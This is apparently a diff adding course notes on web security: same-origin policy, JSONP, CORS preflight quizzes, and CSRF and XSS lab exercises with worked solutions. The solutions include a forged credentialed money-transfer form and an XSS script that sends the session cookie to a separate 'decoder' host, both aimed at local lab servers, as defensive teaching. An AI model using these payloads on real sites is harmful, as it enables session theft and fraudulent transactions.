@@ -1207,8 +1207,427 @@ In the next lesson, we'll take a look at more security measures like cross-origi
 
 You might even get the chance to do some hacking yourself.
 
-<!-- 
 ## 5. Security
 ### 5.1 Security Intro
-Thanks for coming back.Now you might be asking yourself,why are we talking about security again?I mean, we've already talked about TLS and its use in HTTPS.HTTPS as covers many angles of attackfor things like eavesdropping on your traffic,or just impersonating the web server as a whole.However, the most secure front door in the worldwill not be worth anything if there'sa letter to the first floor window.The letter being your web app.HTTP contains some very subtle security risks.On top of that, the history and backwards compatibilityof the HTTP protocol carries a lot of baggagefrom a time where security wasn't as big of a topicas it is now.In this lesson, we are going to learnhow certain design choices could have allowed an attackerto steal sensitive data, and how you as a web developercan protect you web app against such attacks.
- -->
+Thanks for coming back. Now you might be asking yourself, why are we talking about security again? I mean, we've already talked about TLS and its use in HTTPS.
+
+HTTPS covers many angles of attack for things like eavesdropping on your traffic,or just impersonating the web server as a whole. However, the most secure front door in the world will not be worth anything if there's a ladder to the first floor window. The ladder being your web app.
+
+HTTP contains some very subtle security risks. On top of that, the history and backwards compatibility of the HTTP protocol carries a lot of baggage from a time where security wasn't as big of a topic as it is now.
+
+In this lesson, we are going to learn how certain design choices could have allowed an attacker to steal sensitive data, and how you as a web developer can protect you web app against such attacks.
+
+### 5.2 Origins
+As a general rule of thumb, JavaScript is not allowed to access the data of any other origin than its own.
+
+An origin is made up of three parts-
+
+- the data scheme
+- the host name
+- the port
+
+For the page you're on right now, the scheme is `HTTPS`, the host name is `www.udacity.com`, and the port is `443`.
+
+If you change any of these parts, you are on a different origin and different rules will apply.
+
+Apart from the mixed content problems we talked about earlier, this is another reason to not mix HTTP and HTTPS URLs.
+
+But what are these rules that apply once you are working across multiple origins?
+
+First of all, you can't make fetch requests to other origins. Actually, under certain criteria you can, but then you can't read the answer.
+
+[![cs5-1](../assets/images/cs5-1-small.jpg)](../assets/images/cs5-1.jpg)
+
+Secondly, you cannot inspect IFrames or windows with JavaScript if they are from another origin.
+
+These rules make a lot of sense if you think about it. 
+
+Let's assume I was allowed to make fetch requests to other origins. I could just set up a website that makes fetch requests to facebook.com and steal all your Facebook messages.
+
+Or even worse, I could make fetch requests to udacity.com and make you drop out of all of your Udacity classes. No, we don't want that.
+
+This restriction, or rule, is called the `same-origin policy`.
+
+### 5.3 Origins 2
+We just learned some rules. But if there are rules, then there are exceptions to those rules.
+
+As you're very well aware of, we're allowed to include:
+
+- stylesheets
+- images
+- videos
+- IFrames
+- scripts from other origins
+- and send form data to other origins
+
+[![cs5-2](../assets/images/cs5-2-small.jpg)](../assets/images/cs5-2.jpg)
+
+The end user won't be able to tell that one image is loaded from our server while another is loaded from Instagram. However, for web developers, there is a difference.
+
+You can't interact with an image tag that is showing a cross origin image in the same way you could with an image from the same origin. For example, you can't inspect the pixels of the image from inside the Canvas element.
+
+The same goes for a script tag that includes a cross origin script resource.
+
+[![cs5-3](../assets/images/cs5-3-small.jpg)](../assets/images/cs5-3.jpg)
+
+The contents will either just silently appear empty, or in case of more modern APIs, it will explicitly throw an error.
+
+For the same origins script tag, I have access to its contents but I can't access the other origin scripts contents. 
+
+It's important to keep in mind that the user's browser is the one who enforces the same origin policy. It's not the server but the client that will not let you send off requests.
+
+[![cs5-4](../assets/images/cs5-4-small.jpg)](../assets/images/cs5-4.jpg)
+
+We'll see why this is important as we look into getting around same origin policy restrictions in the next video.
+
+### 5.4 Overriding Same Origin Policy
+Sometimes you want to allow other people to access your resources even if they are from another origin.
+
+This is mostly relevant for API providers who want other sites to be able to use the service, but the `same-origin-policy` prevents this.
+
+Nowadays, you can easily achieve this sharing of resources with a set of HTTP headers called **Cross Origin Resource Sharing** or **CORS**, for short.
+
+[![cs5-5](../assets/images/cs5-5-small.jpg)](../assets/images/cs5-5.jpg)
+
+This is the most powerful engineering solution to the single-origin problem. But up until a few years ago, the browser support for CORS was rather lacking and people had to come up with their own techniques to work around the *single-origin-policy* in the meantime.
+
+One of the oldest techniques is called **JSONP**, JSON with Padding.
+
+[![cs5-6](../assets/images/cs5-6-small.jpg)](../assets/images/cs5-6.jpg)
+
+Instead of simply returning data, JSONP returns a script containing the data. This exploits the fact that the scripts from other origins will execute and share the execution environment with your own scripts.
+
+JSONP-based APIs expect to include the function name as a query parameter. The server will return a new script calling the function that you named.
+
+Let's look at a fictional example. Let's say we are building an app at `yourcourselist.com` that wants to list all the university courses the user is enrolled in.
+
+The naive approach would be to make a fetch request to API, `udacity.com` and use the return data to generate a list for the user. 
+
+[![cs5-7](../assets/images/cs5-7-small.jpg)](../assets/images/cs5-7.jpg)
+
+However, this will fail with a security exception as your host differs from Udacity's host.
+
+[![cs5-8](../assets/images/cs5-8-small.jpg)](../assets/images/cs5-8.jpg)
+
+How would this API look if it supports JSONP? Add a function name to the URL and include it with a script tag.
+
+[![cs5-9](../assets/images/cs5-9-small.jpg)](../assets/images/cs5-9.jpg)
+
+The server will wrap all the data it needs to return in a function call with the same name as given via the query parameter.
+
+[![cs5-10](../assets/images/cs5-10-small.jpg)](../assets/images/cs5-10.jpg)
+
+You need to define this function because when the response is returned the function call is executed and you now have access to the data for the parameter of that function.
+
+[![cs5-11](../assets/images/cs5-11-small.jpg)](../assets/images/cs5-11.jpg)
+
+Here's an example of JSONP in action.
+
+- [JSONP Example on JSBin](https://jsbin.com/roxapu/3/edit?html,js,console)
+
+#### Message passing
+Another technique that was explicitly designed to allow cross-origin communication is called **message passing**. `postMessage()` is a function that can be called to pass a message to other windows and iframes, even if they come from a different origin. This creates a `message` event you subscribe to like any other event. For security, the receiver can inspect the message’s origin and content.
+
+While postMessage is much cleaner and allows more granular control than the other cross-origin options, it sadly hasn’t been as widely adopted by API providers.
+
+### 5.5 CORS
+CORS has been adopted by API providers as the primary way to share resources.
+
+[![cs5-12](../assets/images/cs5-12-small.jpg)](../assets/images/cs5-12.jpg)
+
+CORS Headers permit cross origin requests without relying on JavaScript, though they do need some server side code.
+
+[![cs5-13](../assets/images/cs5-13-small.jpg)](../assets/images/cs5-13.jpg)
+
+CORS Headers allows servers to specify a set of origins that are allowed to access its resources.
+
+If the request referrer header is on that list, it will be able to inspect the answer and use the data. Problem solved.
+
+[![cs5-14](../assets/images/cs5-14-small.jpg)](../assets/images/cs5-14.jpg)
+
+However, if you take a closer look, you will realize that by the time the server sends back the headers, the request will already have executed. This can become problematic with destructive operations, because it is already too late to ignore the request.
+
+This is where preflight requests come into play.
+
+A preflight request uses the OPTIONS method and allows the browser to signal that it only wants to check what is allowed and what is not. The server should not execute any kind of business logic, but only return the headers, similar to a head request.
+
+[![cs5-15](../assets/images/cs5-15-small.jpg)](../assets/images/cs5-15.jpg)
+
+However, not all requests will be preflighted. Requests that are made because of image tags or forms will not be preflighted. So any kind of get request will be sent straight away. You just won't be able to read the answer if CORS doesn't allow it.
+
+The details about when preflight requests are actually sent with CORS are a bit detailed. If you wish to read more you can check out the link below.
+
+- [preflight requests and CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Preflighted_requests)
+
+Now, we have a couple of ways to get around the single origin restriction.
+
+If you're ever involved in publishing an API yourself, I'd encourage you to think about CORS from the very beginning and to enable it on your server.
+
+### 5.6 Quiz: Preflight CORS 1
+The next couple of exercises will give you some hands-on experience with a few different HTTP requests.
+
+You need to determine if the request is preflighted or not and if it is preflighted, which line causes it to be preflighted?
+
+So launch the server. And then reconstruct this request in the fetch tool.
+
+[![cs5-16](../assets/images/cs5-16-small.jpg)](../assets/images/cs5-16.jpg)
+
+Use Dev Tools to see that some requests are executed right away, while others send a preflight request.
+
+You'll know it's been preflighted if it uses the OPTIONS method.
+
+Play around with the requests until you figure out what makes the browser preflight the request.
+
+#### 5.6 Solution
+First I need to see which method is used so I'll turn off some of these other distracting columns and turn on the Method column.
+
+Since this request is identical to the request I want to send, I'm not going to change anything.
+
+[![cs5-17](../assets/images/cs5-17-small.jpg)](../assets/images/cs5-17.jpg)
+
+This GET request was sent successfully and since there isn't it OPTIONS request listed here, this request was not preflighted. 
+
+This is referred to as a "simple request". Simple requests take place with GET, HEAD, and POST methods.
+
+When I change the method to PUT this triggers a preflight to take place according to the [preflight rules of the CORS spec](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests).
+
+[![cs5-18](../assets/images/cs5-18-small.jpg)](../assets/images/cs5-18.jpg)
+
+Below I change the method back to GET which should trigger a simple request but since I changed the Content-Type header to a value other than the ones allowed for a simple request, a preflight is also triggered.
+
+[![cs5-19](../assets/images/cs5-19-small.jpg)](../assets/images/cs5-19.jpg)
+
+### 5.7 Quiz: Preflight CORS 2
+Just like the previous quiz,you need to determine if the request is preflighted or not and if it is preflighted, which line or lines causes it to be preflighted.
+
+[![cs5-20](../assets/images/cs5-20-small.jpg)](../assets/images/cs5-20.jpg)
+
+#### 5.7 Solution
+Running this request shows the options method. So I know it's been pre-flighted,but I don't know if it's because it's the POST requestor if it's from the X-Forwarded-For header.
+
+If I delete the header and rerun the request, it doesn't use the options header,so I know that the X-Forwarded-For header caused the request to be pre-flighted.
+
+[![cs5-21](../assets/images/cs5-21-small.jpg)](../assets/images/cs5-21.jpg)
+
+### 5.8 Quiz: Preflight CORS 3
+Just like the previous two quizzes, you need to determine if the request is preflighted or not. If it is preflighted, which line or lines causes it to be preflighted?
+
+[![cs5-22](../assets/images/cs5-22-small.jpg)](../assets/images/cs5-22.jpg)
+
+### 5.8 Solution
+Sending this request shows the OPTIONS method. So it's been preflighted.
+
+[![cs5-23](../assets/images/cs5-23-small.jpg)](../assets/images/cs5-23.jpg)
+
+If I delete the header and send the request again, it's still been preflighted. And if I add the header back in and change the method to something I know isn't preflighted, like GET, then it doesn't use the OPTIONS header.
+
+[![cs5-24](../assets/images/cs5-24-small.jpg)](../assets/images/cs5-24.jpg)
+
+So the Accept header doesn't cause a preflight, but the PUT method does.
+
+### 5.9 Security Exploit - CSRF
+As we just learned, requests that looked just like they came from a form will not be preflighted.
+
+You can't read the response if CORS doesn't allow it. But sometimes you might not need to see the response to wreak havoc.
+
+Imagine a bank that has a form to transfer money. If you are not a good person, you can wire the money to your own account. You don't care about what the server answers. You simply set up a website that forges a request of the same URL the form uses and set the parameters so that the money is wired to you and the user won't even notice.
+
+That's why this kind of attack is called **Cross-Site Request Forgery** or CSRF. 
+
+[![cs5-25](../assets/images/cs5-25-small.jpg)](../assets/images/cs5-25.jpg)
+
+Of course, banks have sophisticated protection mechanisms. But for most purposes, a CSFR token is protection enough.
+
+A CSFR token is an additional field appended to a form that has been put there by the server, and it's stored server site as well.
+
+If someone is submitting a request, the CSFR checks that token against the one it has stored and only executes requests if these tokens match.
+
+### 5.10 Quiz: CSRF
+Do you remember that fictional bank we talked about with the exploitable money transferform? Well, it's real and we want you to exploit its weakness.
+
+The server for this project has two endpoints, a bank's website and an evil URL, where you'll be able to place your code.
+
+The bank's URL gives us a Login page for the bank's website. The password is "`super secret password`".
+
+Here's the bank's beautifully designed Balance page.
+
+[![cs5-26](../assets/images/cs5-26-small.jpg)](../assets/images/cs5-26.jpg)
+
+What you need to do is send the umbrella corporation 666 units.
+
+But you can't just do it here on this site. The other URL is the evil site. This site hosts anything you put in the evil directory, so you need to create a website that will send a CRF request to the bank.
+
+This quiz will take a number of steps to complete, but you're hacking a fake bank so it's awesome.
+
+1. You need to sign into the bank's website so that the evil website will have access to your login cookie.
+2. Then create a website in the Evil folder that will send a POST request to the bank's `/transer` URL.
+3. The posted data needs to set the recipient to umbrella corp and the amount is 666.
+4. To send along the cookie data in a Fetch request, the credentials flag needs to be set to Include.
+  
+If you do everything correctly, the server will give you a token. Now, that's the server not the browser's console, so check the terminal.
+
+[![cs5-27](../assets/images/cs5-27-small.jpg)](../assets/images/cs5-27.jpg)
+
+#### 5.10 Solution
+I've logged into the bank, so the log in cookie is set in my browser. Opening up DevTools, I can see the cookie here.
+
+[![cs5-28](../assets/images/cs5-28-small.jpg)](../assets/images/cs5-28.jpg)
+
+Now I need to create a website that will send the forged request. 
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Evil Form</title>
+</head>
+<body>
+  <label for="recip">Recipient:</label>
+  <input type="text" name="recip" id="recip" value="Umbrella Corp"><br>
+  <label for="amt">Amount</label>
+  <input type="text" name="amt" id="amt" value="666"><br>
+  <button id="send">Send</button>
+<script>
+  window.onload = function() {
+    const recip = document.querySelector('#recip');
+    const amt = document.querySelector('#amt');
+    const btn = document.querySelector('#send');
+    btn.addEventListener('click', handlePost, false);
+
+    function handlePost(e) {
+      e.preventDefault();
+      const data = `recipient=${recip.value}&amount=${amt.value}`
+      console.log(data);
+
+      fetch('http://bank.127.0.0.1.xip.io:8080/transfer', {
+        method: 'POST',
+        mode: 'no-cors',
+        credentials: 'include',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: data
+      })
+        .then(response => response.text())
+        .then(text => console.log(text))
+        .catch(err => console.log(err));
+    }
+  }
+</script>
+</body>
+</html>
+```
+
+When they click the button, I want a request to be sent off to the bank's transfer URL.
+
+The transfer URL is expecting a post request. The body of the request needs to be the recipient, and the amount of money being transferred.
+
+Since this is a POST request, the Content-Type header has to be set to `application/x-www-form-urlencoded`.
+
+Now this code will send a request, but the bank's web site checks for a specific cookie. `credentials: 'include'` sends along cookies for this domain. If the user is already logged into the bank, then the browser has the login cookie, and automatically includes it when the request is sent.
+
+Lastly, clicking the button sends the request.
+
+In DevTools, I can see the request that just got sent. And here is the cookie that got set in the other tab.
+
+[![cs5-29](../assets/images/cs5-29-small.jpg)](../assets/images/cs5-29.jpg)
+
+Refreshing the bank site, I see this new entry. It worked.
+
+[![cs5-30](../assets/images/cs5-30-small.jpg)](../assets/images/cs5-30.jpg)
+
+This was an involved exercise, so great job.
+
+### 5.11 Security Exploit - XSS
+Whenever a website shows a user's input, you need to be careful and vigilant. A user's input can be anything and it is your responsibility to make sure it won't break your site.
+
+A clueless user might break it by accident, an evil user might exploit this flaw and make your website do things that it did not intend at all.
+
+Not validating user input is one of the oldest vulnerabilities on the web and is called cross-site scripting or XSS for short.
+
+[![cs5-31](../assets/images/cs5-31-small.jpg)](../assets/images/cs5-31.jpg)
+
+The name comes from the fact that JavaScript can be injected into another site where it gets executed and has access to all of its site's data.
+
+A typical example is a website that asks for a user's name when they want to leave a comment. If this input is not validated, a user's name can be crafted in such a way that it contains JavaScript code. That means that every user reading that comment will only see the name, but the code will be executed without the user's knowledge.
+
+[![cs5-32](../assets/images/cs5-32-small.jpg)](../assets/images/cs5-32.jpg)
+
+In the grand scheme of things, this example here is rather harmless. But the script has access to all of the site's data, including the dom and cookies.
+
+It could even make fetch requests from the site's origin. A well-crafted XSS exploit can be detrimental. The only way you can secure yourself against these kinds of attacks is to follow a golden rule that always applies in software engineering. Validate your user's input server-side.
+
+### 5.12 Quiz: XSS
+The server for this project has two end points, a bad website URL and a decoder URL.
+
+The bad website page has a form that is vulnerable to cross site scripting.
+
+You need to exploit this vulnerability by sending this site's cookie to the decoder website.
+
+To complete this quiz, create a `fetch` request using the URL below. You need to use JavaScript to set the key to the value of the bad website's SESSION_ID cookie.
+
+[![cs5-33](../assets/images/cs5-33-small.jpg)](../assets/images/cs5-33.jpg)
+
+If you did everything correctly, the server will give you a pass phrase. And that's the server, not the browser's console, so check the terminal.
+
+#### 5.12 Solution
+The URL I need for fetch is
+
+```html
+http://decoder.127.0.0.1.xip.io:8080/?key=
+```
+
+Now I need to set the `key` value to the SESSION_ID in cookie. `document.cookie` gets all of the cookies. Then I'll split on the equal sign and I'll get the cookies value.
+
+```js
+document.cookie.split('=')[1];
+```
+
+This code is rather naive and assumes that the session ID cookie is the very first one, which it is, in this case.
+
+```bash
+james
+> <script>
+> fetch('http://decoder.127.0.0.1.xip.io:8080/?key='
+> +document.cookie.split('=').[1]);
+> </script>
+```
+
+[![cs5-34](../assets/images/cs5-34-small.jpg)](../assets/images/cs5-34.jpg)
+
+If I wanted a more robust script I might have used this.
+
+```js
+document.cookie.slice(
+    document.cookie.indexOf('SESSION_ID')
+).split('=')[1]
+```
+
+### 5.13 Security Summary
+Security is not an easy subject, and the issues we covered in this lesson are not sufficiently fixable on just the front end.
+
+Your back end, whatever it is, needs to implement validation as well to be properly secured against CSRF and cross-site scripting attacks.
+
+What you have learned here is how to spot potential vulnerabilities, and how to verify if they are exploitable.
+
+Whenever you are about to add any kind of input field in your web app, you should immediately start thinking about cross-site scripting and CSRF, and whether there are potential risks that need to be mitigated.
+
+You'll do yourself and your users a big favor.
+
+### 5.14 Course Wrap-up
+Making a server and a client communicate with each other isn't that hard, but doing it correctly, efficiently, and securely is a much more complex task than it might seem.
+
+We have covered a lot of topics in this course. We've taken a look at 
+
+- the request and response cycle, where the browser and the server get connected with each other.
+- HTTP's verbs, headers, REST, and performance issues.
+- HTTPS, TLS, and cryptography
+- HTTP/2 and all the amazing benefits it brings to the web ecosystem.
+- security precautions with the same origin policy, ways to get around that policy, and then some vulnerabilities like CSRF and cross-site scripting.
+
+We covered a lot of techniques, but the important thing to keep in mind throughout all of this is keeping your user secure.
+
+Thanks for joining us on this journey of client server communication.
